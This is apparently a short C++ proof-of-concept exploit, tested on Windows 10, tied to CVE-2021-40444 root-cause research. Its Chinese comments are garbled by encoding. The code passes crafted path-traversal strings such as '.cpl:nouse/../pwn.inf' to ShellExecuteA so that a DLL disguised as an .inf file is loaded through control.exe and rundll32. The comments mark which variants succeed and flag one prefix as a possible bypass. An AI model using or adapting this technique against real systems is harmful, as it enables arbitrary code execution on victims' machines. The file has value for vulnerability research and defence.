/*
tested on windows 10 x64 10.0.19041.1237 

ShellExecute POC
����ԭ��:
    ShellExecute ϵ�к����ڿ� lpVerb/lpOp �������, �Ὣע����� CLASS_ROOT�µ������������urlЭ��
    ������·��ƴ�ӵ�����¿��Ա����̷�·��

Ԥ��Ч��:
    ����׺������ url scheme, ִ�б��������ļ�

refer: 
    ���� CVE-2021-40444 Root Cause �о�
*/

#include <iostream>
#include <windows.h>

int main() {
    // pwn.inf�Ǻ͵�ǰ����ͬ·���µ�DLL, .cpl����control.exe -> rundll32���·�����м���

    ShellExecuteA(NULL, "", "url:.cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Succeed, ǰ���url����һ�ֿ��ܵ��ƹ��ֶ�
    ShellExecuteA(NULL, NULL, ".cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Succeed

    ShellExecuteA(NULL, "Open", "url:.cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Failed
    ShellExecuteA(NULL, "Open", ".cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Failed
}